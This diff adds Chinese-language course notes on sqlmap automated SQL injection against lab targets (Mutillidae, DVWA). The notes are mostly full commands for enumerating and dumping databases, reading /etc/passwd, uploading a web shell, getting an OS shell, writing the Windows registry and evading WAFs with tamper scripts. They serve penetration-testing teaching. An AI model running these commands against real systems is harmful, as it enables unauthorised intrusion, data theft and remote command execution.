@@ -1,0 +1,158 @@
+课时96 SQLMAP自动注入-ENUMERATION、BRUTE FORCE、UDF INJECTION、FILE SYSTEM、OS、WINDOWS REGISTORY、GENERAL、MISCELLANEOUS
+
+伪静态页面不能注入，这是错误的！
+
+SQLMAP自动注入08-----ENUMERATION
+--current-user
+--current-db
+--hostname
+--users
+--privileges -U username (CU当前账号）
+--roles
+--dbs
+--tables,--exclude-sysdbs -D dvwa
+-T user -D dvwa -C user --columns
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 --current-user
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 --user
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 --privileges -U guest
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 --roles
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 --dbs
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 -D dvwa --table
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 -D dvwa -T users --columns
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 -D dvwa -T users --count
+
+SQLMAP自动注入08-----ENUMERATION
+--schema --batch --exclude-sysdbs 元数据（使用默认选项）
+--count
+Dump数据
+    --dump,-C,-T,-D,--start,--stop
+    --dump-all --exclude-sysdbs
+    --sql-query "select * from users"
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 --schema --batch --exclude-sysdbs
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 -D dvwa -T users --dump
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --tamper="tamper/between.py,tamper/randomcase.py,tamper/space?comment.py" -v 3 -D dvwa -T users --dump-all
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --sql-query "select * from users"
+
+SQLMAP自动注入09-----BRUTE FORCE
+Mysql<5.0,没有information_schema库
+Mysql>=5.0,但无权读取information_schema库
+微软的access数据库，默认无权读取MSysObjects库
+--common-tables
+--common-columns (Access系统表无列信息)
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" --common-tables
+
+SQLMAP自动注入10-----UDF INJECTION
+--udf-inject,--shared-lib
+    编译共享库创建并上传至DB Server,以此生成UDF实现高级注入
+    Linux:  shared object
+    Windows:  DLL
+    http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-
+    full-control-whitepaper-4633857
+
+SQLMAP自动注入11-----FILE SYSTEM
+--file-read="/etc/passwd"
+--file-write="shell.php" --file-dest"/tmp/shell.php"
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --file-read="/etc/passwd"
+
+root@R:~# cd /root/.sqlmap/output/192.168.1.115
+
+root@R:/.sqlmap/output/192.168.1.115# ls
+dump  files  log  session.sqlite  target.txt
+
+root@R:/.sqlmap/output/192.168.1.115# cd files/
+
+root@R:/.sqlmap/output/192.168.1.115/files# ls
+_etc_passwd
+
+root@R:/.sqlmap/output/192.168.1.115/files# cat _etc_passwd
+
+root@R:~# vi shell.php
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --file-write="shell.php" --file-dest="/tmp/shell.php"
+
+SQLMAP自动注入12-----OS
+Mysql、postgresql
+    上传共享库并生成sys_exec()、sys_eval()两个UDF
+Mssql
+    xp_cmdshell存储过程（有九用，禁了启，没有键）
+--sql-shell
+--os-shell
+--os-cmd
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --os-cmd
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --os-shell
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --sql-shell
+
+SQLMAP自动注入13-----WINDOWS REGISTORY
+--reg-read
+--reg-add
+--reg-del
+--reg-key、--reg-value、--reg-data、--reg-type
+sqlmap.py -u="http://1.1.1.1/a.php?id=1 --reg-add\ --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG-SZ --reg-data=1
+
+SQLMAP自动注入14-----GENERAL
+-s: sqlite会话文件保存位置
+-t: 记录流浪文件保存位置
+--charset: 强制字符编码
+    --charset=GBK
+--crawl: 从起始位置爬站深度
+    --batch --crawl=3
+--csv-del: dump数据默认存于","分割的CSV文件中，指定其他分隔符
+    --csv-del=";"
+--dbms-cred: 指定数据库账号
+
+SQLMAP自动注入14-----GENERAL
+--flush-session: 清空session
+--force-ssl
+--fresh-queries: 忽略session查询结果
+--hex: dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原
+    sqlmap -u "http://1.1.1.1/s.php?id=1" --hex -v 3
+--output-dir=/tmp
+--parse-error: 分析和现实数据库内建报错信息
+    sqlmap -u "http://1.1.1.1/sqlmap/a.php?id=1" --parse-errors
+--save: 将命令保存成配置文件
+
+root@R:~# sqlmap -u "http://192.168.1.115/mutillidae/index.php?page=user-info.php&username=1&password=2&user-info-php-submit-button=View+Account+Details" -p "user-agent,username" --dbs --fresh-queries --save
+
+SQLMAP自动注入15-----MISCELLANEOUS
+-z: 参数助记符
+sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u
+"1.1.1.1/a.php?id=1"
+sqlmap -z "bat,randcma,ign,tec=BEU" -u "1.1.1.1/a.php?id=1"
+sqlmap -ignore-proxy --flush-session --technique=U --dump -D testdb -
+T user -u "1.1.1.1/a.php?id=1"
+sqlmap -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u
+"1.1.1.1/vuln.php?id=1"
+
+SQLMAP自动注入15-----MISCELLANEOUS
+--answer
+    sqlmap -u "http://1.1.1.1/a.php?id=1" --technique=E --
+    answers="extending=N" --batch
+--check-waf: 检测WAF/IPS/IDS
+--hpp: HTTP parameter pollution
+    绕过WAF/IPS/IDS的有效方法
+    尤其对ASP/ISS 和 ASP.NET/IIS
+--identify-waf: 彻底的waf/ips/ids检查
+    支持30多种产品
+
+SQLMAP自动注入15-----MISCELLANEOUS
+--mobile: 模拟智能手机设备
+--purge-output: 清楚output文件夹
+--smart: 当有大量检测目标时，只选择基于错误的检测结果
+--wizard: 向导
